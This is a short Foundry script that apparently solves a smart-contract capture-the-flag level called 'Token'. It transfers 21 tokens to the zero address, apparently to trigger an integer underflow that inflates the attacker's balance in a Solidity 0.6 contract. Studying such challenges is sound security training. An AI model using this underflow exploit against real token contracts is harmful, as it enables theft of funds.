// SPDX-License-Identifier: MIT

pragma solidity ^0.6.2;

import { Script, console } from "forge-std/Script.sol";
import { HelperConfig } from "./HelperConfig.s.sol";
import { Token } from "../src/05_Token.sol";

contract TokenAttacker is Script {

  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {
    
    HelperConfig helperConfig = new HelperConfig();
    address challengeInstanceAddress = helperConfig.instances("Token");
    Token challenge = Token(challengeInstanceAddress);
        
    vm.startBroadcast(deployerPrivateKey);
    console.log("msg.sender: %s", msg.sender);
    challenge.transfer(address(0), 21);
    console.log("balanceOf(msg.sender): %s", challenge.balanceOf(msg.sender));
    vm.stopBroadcast();
  }

}